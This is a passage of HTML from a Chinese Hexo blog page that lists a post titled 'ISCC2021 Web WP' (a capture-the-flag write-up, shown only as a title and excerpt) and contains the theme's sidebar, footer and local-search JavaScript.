<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;abcdefg&#125;<br></code></pre></td></tr></table></figure></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/05/27/ISCC2021-Web-WP/">ISCC2021 Web WP</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2021-05-27</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">6.7k</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>   ISCC2021 Web WP</p></div><div class="post-readmore"><a class="post-readmore__link" href="/2021/05/27/ISCC2021-Web-WP/"><span class="post-readmore__text">阅读全文</span><span class="post-readmore__icon"><i class="fas fa-long-arrow-alt-right"></i></span></a></div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/2.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Atkx</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/swhat" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">10</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">22</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>